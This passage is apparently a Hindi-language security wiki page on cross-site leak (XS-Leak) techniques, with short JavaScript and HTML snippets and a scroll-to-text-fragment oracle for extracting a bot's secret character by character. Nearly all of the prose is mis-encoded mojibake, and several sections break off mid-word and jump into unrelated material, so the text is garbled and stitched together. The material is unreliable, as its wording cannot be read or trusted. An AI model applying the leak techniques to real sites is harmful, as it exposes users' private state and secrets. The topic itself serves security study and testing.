* **рд╕рд╛рд░рд╛рдВрд╢:** рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рд▓рдВрдмрд╛рдИ рдмрд╣реБрдд рдмрдбрд╝реА рд╣реЛ рд╕рдХрддреА рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ рдПрдХ рддреНрд░реБрдЯрд┐ рдХреЗ рд╕рд╛рде рдЬрд╡рд╛рдм рджреЗрддрд╛ рд╣реИ рдФрд░ рдПрдХ рдЕрд▓рд░реНрдЯ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

### URL рдЕрдзрд┐рдХрддрдо рд▓рдВрдмрд╛рдИ - рдХреНрд▓рд╛рдЗрдВрдЯ рд╕
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### рдлреНрд░реЗрдо рдЧрд┐рдирддреА

* **рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдо, рдкреЙрдк-рдЕрдкреНрд╕
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рдкреЗрдЬ рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдлреНрд░реЗрдореЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдкрдврд╝реЗрдВ (window.length).
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

`iframe` рдпрд╛ `window.open` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЦреЛрд▓реЗ рдЧрдП **рд╡реЗрдм рдореЗрдВ рдлреНрд░реЗрдореЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдЧрд┐рдирдирд╛** рдЙрд╕ рдкреЗрдЬ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА **рд╕реНрдерд┐рддрд┐ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдкреЗрдЬ рдореЗрдВ рд╣рдореЗрд╢рд╛ рд╕рдорд╛рди рд╕рдВрдЦреНрдпрд╛ рдореЗрдВ рдлреНрд░реЗрдо рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ **рдирд┐рд░рдВрддрд░** рдлреНрд░реЗрдореЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдХреА рдЬрд╛рдБрдЪ рдХрд░рдиреЗ рд╕реЗ рдПрдХ **рдкреИрдЯрд░реНрди** рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдорд┐рд▓ рд╕рдХрддреА рд╣реИ рдЬреЛ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ **рд▓реАрдХ** рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдпрд╣ рд╣реИ рдХрд┐ рдХреНрд░реЛрдо рдореЗрдВ, рдПрдХ **PDF** рдХреЛ **рдлреНрд░реЗрдо рдЧрд┐рдирддреА** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдкрддрд╛ рд▓рдЧрд╛рдпрд╛** рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдВрддрд░рд┐рдХ рд░реВрдк рд╕реЗ `embed` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) рд╣реИрдВ рдЬреЛ рд╕рд╛рдордЧреНрд░реА рдкрд░ рдХреБрдЫ рдирд┐рдпрдВрддреНрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ `zoom`, `view`, `page`, `toolbar` рдЬрд╣рд╛рдБ рдпрд╣ рддрдХрдиреАрдХ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛ рд╕рдХрддреА рд╣реИред

### HTMLElements

* **рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐рдпрд╛рдБ**: HTML рддрддреНрд╡
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рдкреЗрдЬ рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **рд╕рд╛рд░рд╛рдВрд╢:** 2 рд╕рдВрднрд╛рд╡рд┐рдд рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд▓реАрдХ рд╣реБрдИ рдорд╛рди рдХреЛ рдкрдврд╝реЗрдВ
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

рдХреБрдЫ рд╡реЗрдмрдкреЗрдЬ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рдЖрдзрд╛рд░ рдкрд░ **рдЧрддрд┐рд╢реАрд▓ рд░реВрдк рд╕реЗ рдореАрдбрд┐рдпрд╛ рдлрд╛рдЗрд▓реЗрдВ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдпрд╛ рд╡реЙрдЯрд░рдорд╛рд░реНрдХ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдореАрдбрд┐рдпрд╛ рдХрд╛ рдЖрдХрд╛рд░ рдмрджрд▓рддреЗ рд╣реИрдВред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрди HTML рддрддреНрд╡реЛрдВ рджреНрд╡рд╛рд░рд╛ рд▓реАрдХ рдХреА рдЧрдИ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рдВрднрд╛рд╡рд┐рдд рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдХреБрдЫ HTMLElements рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдХреЛ рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХ рдХрд░реЗрдВрдЧреЗ рдЬреИрд╕реЗ рдХрд┐ рд╡реЗ рдХрд┐рд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдореАрдбрд┐рдпрд╛ рд╣реИрдВ:

* [HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) рдореАрдбрд┐рдпрд╛ `duration` рдФрд░ `buffered` рд╕рдордп рд▓реАрдХ рдХрд░рддрд╛ рд╣реИред
* [HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement) `videoHeight` рдФрд░ `videoWidth` рд▓реАрдХ рдХрд░рддрд╛ рд╣реИ рдХреБрдЫ рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдореЗрдВ `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` рдФрд░ `webkitDecodedFrameCount` рднреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред
* [getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality) `totalVideoFrames` рд▓реАрдХ рдХрд░рддрд╛ рд╣реИред
* [HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement) `height` рдФрд░ `width` рд▓реАрдХ рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдпрджрд┐ рдЫрд╡рд┐ рдЕрдорд╛рдиреНрдп рд╣реИ рддреЛ рд╡реЗ 0 рд╣реЛрдВрдЧреЗ рдФрд░ [`image.decode()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode) рдЕрд╕реНрд╡реАрдХреГрдд рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

### CSS рд╕рдВрдкрддреНрддрд┐

* **рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐рдпрд╛рдБ**: HTML рддрддреНрд╡
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рдкреЗрдЬ рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реНрдЯрд╛рдЗрд▓рд┐рдВрдЧ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ **рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реНрдЯрд╛рдЗрд▓рд┐рдВрдЧ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ**ред рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди CSS рдлрд╛рдЗрд▓реЛрдВ рдХреЛ **HTML рд▓рд┐рдВрдХ рддрддреНрд╡** рдХреЗ рд╕рд╛рде рд╣рдорд▓рд╛рд╡рд░ рдкреЗрдЬ рдкрд░ рдПрдореНрдмреЗрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ **рдирд┐рдпрдо** рд╣рдорд▓рд╛рд╡рд░ рдкреЗрдЬ рдкрд░ **рд▓рд╛рдЧреВ** рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗред рдпрджрд┐ рдХреЛрдИ рдкреЗрдЬ рдЗрди рдирд┐рдпрдореЛрдВ рдХреЛ рдЧрддрд┐рд╢реАрд▓ рд░реВрдк рд╕реЗ рдмрджрд▓рддрд╛ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЗрди **рдЕрдВрддрд░реЛрдВ** рдХрд╛ **рдкрддрд╛ рд▓рдЧрд╛** рд╕рдХрддрд╛ рд╣реИред\
рдПрдХ рд▓реАрдХ рддрдХрдиреАрдХ рдХреЗ рд░реВрдк рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ `window.getComputedStyle` рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ HTML рддрддреНрд╡ рдХреА **CSS рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рдХреЛ рдкрдврд╝** рд╕рдХрддрд╛ рд╣реИред рдирддреАрдЬрддрди, рдпрджрд┐ рдкреНрд░рднрд╛рд╡рд┐рдд рддрддреНрд╡ рдФрд░ рд╕рдВрдкрддреНрддрд┐ рдХрд╛ рдирд╛рдо рдЬреНрдЮрд╛рдд рд╣реИ рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдордирдорд╛рдиреА CSS рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рдХреЛ рдкрдврд╝ рд╕рдХрддрд╛ рд╣реИред

### CSS рдЗрддрд┐рд╣рд╛рд╕

* **рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐рдпрд╛рдБ**: HTML рддрддреНрд╡
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рдкреЗрдЬ рд╕рд╛рдордЧреНрд░реА
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **рд╕рд╛рд░рд╛рдВрд╢:** рдкрддрд╛ рд▓рдЧрд╛рдПрдВ рдХрд┐ рдХреНрдпрд╛ `:visited` рд╢реИрд▓реА рдХрд┐рд╕реА URL рдкрд░ рд▓рд╛рдЧреВ рдХреА рдЧрдИ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдЗрд╕реЗ рдкрд╣рд▓реЗ рд╣реА рджреЗрдЦрд╛ рдЬрд╛ рдЪреБрдХрд╛ рд╣реИ
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
[**рдЗрд╕**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдпрд╣ рд╣реЗрдбрд▓реЗрд╕ рдХреНрд░реЛрдо рдореЗрдВ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИред
{% endhint %}

CSS [`:visited`](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited) рд╕реЗрд▓реЗрдХреНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рджреЗрдЦреЗ рдЧрдП URL рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрд▓рдЧ рд╢реИрд▓реА рд▓рд╛рдЧреВ рдХреА рдЬрд╛рдПред\
рдкрд╣рд▓реЗ [`getComputedStyle()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рдЕрдВрддрд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рдерд╛ рд▓реЗрдХрд┐рди рдЕрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЗрд╕реЗ рд░реЛрдХрддреЗ рд╣реИрдВ рдФрд░ рд╣рдореЗрд╢рд╛ рдорд╛рди рд╡рд╛рдкрд╕ рдХрд░рддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ рд▓рд┐рдВрдХ рджреЗрдЦрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ рд╕реЗрд▓реЗрдХреНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓рд╛рдЧреВ рдХреА рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реА рд╢реИрд▓рд┐рдпреЛрдВ рдХреЛ рд╕реАрдорд┐рдд рдХрд░рддреЗ рд╣реИрдВред\
рдЗрд╕рд▓рд┐рдП, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЙрд╕ рдХреНрд╖реЗрддреНрд░ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЪрд╛рд▓рд╛рдХреА рдХрд░рдиреЗ рдХреА рдЬрд░реВрд░рдд рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬрд┐рд╕реЗ CSS рдиреЗ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд┐рдпрд╛ рд╣реИ рдЗрд╕реЗ [`mix-blend-mode`](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдмрд┐рдирд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдмрд╛рддрдЪреАрдд рдХреЗ рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рднреА рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ рд░реЗрдВрдбрд░ рд╕рдордп рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рдпрд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд▓рд┐рдВрдХ рдХреЛ рдЕрд▓рдЧ рд░рдВрдЧ рдореЗрдВ рдкреЗрдВрдЯ рдХрд░рдиреЗ рдореЗрдВ рд╕рдордп рд▓рдЧрддрд╛ рд╣реИред\
рдХреНрд░реЛрдорд┐рдпрдо рд░рд┐рдкреЛрд░реНрдЯ рдкрд░ рдПрдХ PoC рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдЬреЛ рд╕рдордп рдЕрдВрддрд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рд▓рд┐рдВрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред

### ContentDocument X-Frame Leak

* **рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рд╡рд┐рдзрд┐рдпрд╛рдБ**: рдлреНрд░реЗрдо
* **рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдпреЛрдЧреНрдп рдЕрдВрддрд░**: рд╣реЗрдбрд░реНрд╕
* **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **рд╕рд╛рд░рд╛рдВрд╢:** GC рдореЗрдВ, рдЬрдм рдХрд┐рд╕реА рдкреЗрдЬ рдХреЛ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдкреЗрдЬ рдкрд░ рдПрдореНрдмреЗрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **X-Frame-Options рдХреЗ рдХрд╛рд░рдг, рдПрдХ рддреНрд░реБрдЯрд┐ рдкреЗрдЬ рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред
* **рдХреЛрдб рдЙрджрд╛рд╣рд░рдг**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

рдХреНрд░реЛрдо рдореЗрдВ, рдЬрдм рдХрд┐рд╕реА рдкреЗрдЬ рдХреЛ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдкреЗрдЬ рдкрд░ рдПрдореНрдмреЗрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдо
```html
<img src=/something loading=lazy >
```
рдЗрд╕рд▓рд┐рдП, рдЖрдк рдЬреЛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд╣ рд╣реИ **рдмрд╣реБрдд рд╕рд╛рд░реЗ рдмреЗрдХрд╛рд░ рдЕрдХреНрд╖рд░ рдЬреЛрдбрд╝рдирд╛** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **рд╣рдЬрд╛рд░реЛрдВ "W"**), рддрд╛рдХрд┐ **рд╡реЗрдм рдкреЗрдЬ рдХреЛ рднрд░ рджреЗрдВ рд╕реАрдХреНрд░реЗрдЯ рд╕реЗ рдкрд╣рд▓реЗ рдпрд╛ рдХреБрдЫ рдРрд╕рд╛ рдЬреЛрдбрд╝реЗрдВ** `<br><canvas height="1850px"></canvas><br>.`\
рдлрд┐рд░ рдЕрдЧрд░ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд╣рдорд╛рд░рд╛ **injection рдлреНрд▓реИрдЧ рд╕реЗ рдкрд╣рд▓реЗ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ**, рддреЛ **рдЗрдореЗрдЬ** **рд▓реЛрдб рд╣реЛ рдЬрд╛рдПрдЧреА**, рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдпрд╣ **рдлреНрд▓реИрдЧ рдХреЗ рдмрд╛рдж** рдЖрддрд╛ рд╣реИ, рддреЛ рдлреНрд▓реИрдЧ + рдмреЗрдХрд╛рд░ рдХреА рдЪреАрдЬреЗрдВ **рдЗрд╕реЗ рд▓реЛрдб рд╣реЛрдиреЗ рд╕реЗ рд░реЛрдХ рджреЗрдВрдЧреА** (рдЖрдкрдХреЛ рдпрд╣ рджреЗрдЦрдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдХрд┐рддрдирд╛ рдмреЗрдХрд╛рд░ рдбрд╛рд▓рдирд╛ рд╣реИ). рдпрд╣реА [**рдЗрд╕ рд░рд╛рдЗрдЯрдЕрдк рдореЗрдВ**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) рд╣реБрдЖ рдерд╛ред

рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИ **scroll-to-text-fragment** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛, рдЕрдЧрд░ рдЕрдиреБрдорддрд┐ рд╣реЛ:

#### Scroll-to-text-fragment

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк **рдмреЙрдЯ рдХреЛ рдкреЗрдЬ рдПрдХреНрд╕реЗрд╕ рдХрд░рд╛рддреЗ рд╣реИрдВ** рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рд╕реЗ
```
#:~:text=SECR
```
рд╡реЗрдм рдкреЗрдЬ рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╣реЛрдЧрд╛: **`https://victim.com/post.html#:~:text=SECR`**

рдЬрд╣рд╛рдВ post.html рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдЬрдВрдХ рдЕрдХреНрд╖рд░ рдФрд░ рдЖрд▓рд╕реА рд▓реЛрдб рдЗрдореЗрдЬ рд╣реЛрддреА рд╣реИ рдФрд░ рдлрд┐рд░ рдмреЙрдЯ рдХрд╛ рд░рд╣рд╕реНрдп рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрд╣ рдкрд╛рда рдмреЙрдЯ рдХреЛ рдкреЗрдЬ рдореЗрдВ рдХрд┐рд╕реА рднреА рдкрд╛рда рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░реЗрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ `SECR` рдЯреЗрдХреНрд╕реНрдЯ рд╣реЛрддрд╛ рд╣реИред рдЪреВрдВрдХрд┐ рдпрд╣ рдЯреЗрдХреНрд╕реНрдЯ рд░рд╣рд╕реНрдп рд╣реИ рдФрд░ рдпрд╣ рд╕рд┐рд░реНрдл **рдЗрдореЗрдЬ рдХреЗ рдиреАрдЪреЗ** рд╣реИ, **рдЗрдореЗрдЬ рдХреЗрд╡рд▓ рддрднреА рд▓реЛрдб рд╣реЛрдЧреА рдЬрдм рдЕрдиреБрдорд╛рдирд┐рдд рд░рд╣рд╕реНрдп рд╕рд╣реА рд╣реЛрдЧрд╛**ред рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЗ рдкрд╛рд╕ рд░рд╣рд╕реНрдп рдХреЛ **рдЕрдХреНрд╖рд░ рджрд░ рдЕрдХреНрд╖рд░ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдУрд░реЗрдХрд▓ рд╣реИ**ред

рдЗрд╕рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдХреЛрдб рдЙрджрд╛рд╣рд░рдг: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### рдЗрдореЗрдЬ рдЖрд▓рд╕реА рд▓реЛрдбрд┐рдВрдЧ рд╕рдордп рдЖрдзрд╛рд░рд┐рдд

рдпрджрд┐ **рдмрд╛рд╣рд░реА рдЗрдореЗрдЬ рдХреЛ рд▓реЛрдб рдХрд░рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ** рдЬреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдпрд╣ рд╕рдВрдХреЗрдд рджреЗ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЗрдореЗрдЬ рд▓реЛрдб рд╣реЛ рдЧрдИ рд╣реИ, рддреЛ рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рд╣реЛрдЧрд╛ рдХрд┐ **рдХрдИ рдмрд╛рд░ рдЕрдХреНрд╖рд░ рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдПрдВ рдФрд░ рдЙрд╕реЗ рдорд╛рдкреЗрдВ**ред рдпрджрд┐ рдЗрдореЗрдЬ рд▓реЛрдб рд╣реЛ рдЬрд╛рддреА рд╣реИ рддреЛ рд╕рднреА рдЕрдиреБрд░реЛрдз рдЙрд╕ рд╕рдордп рд╕реЗ рдЕрдзрд┐рдХ рд╕рдордп рд▓реЗрдВрдЧреЗ рдЬрдм рдЗрдореЗрдЬ рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред рдпрд╣реА рд╡рд┐рдзрд┐ [**рдЗрд╕ рд░рд╛рдЗрдЯрдЕрдк рдХреЗ рд╕рдорд╛рдзрд╛рди рдореЗрдВ рдкреНрд░рдпреЛрдЧ рдХреА рдЧрдИ рдереА**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **рдпрд╣рд╛рдВ рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

